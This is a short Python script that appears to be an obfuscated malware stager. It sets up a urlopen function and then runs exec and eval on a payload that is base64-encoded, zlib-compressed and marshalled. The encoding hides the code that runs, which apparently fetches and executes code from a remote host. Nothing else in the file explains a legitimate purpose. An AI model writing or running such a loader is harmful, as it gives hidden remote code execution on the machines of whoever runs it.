import sys,zlib,base64,marshal,json,urllib
if sys.version_info[0] > 2:
    from urllib import request
urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
exec(eval(marshal.loads(zlib.decompress(base64.b64decode(b'eJwrtWFgYCgtyskvSM3TUM8oKSmw0tc3tDTSMzSz0DPQA7KsTE1NzfT19YtLEtNTi4r1swtS9Aoq1TX1ilITUzQ0AVDTEnQ=')))))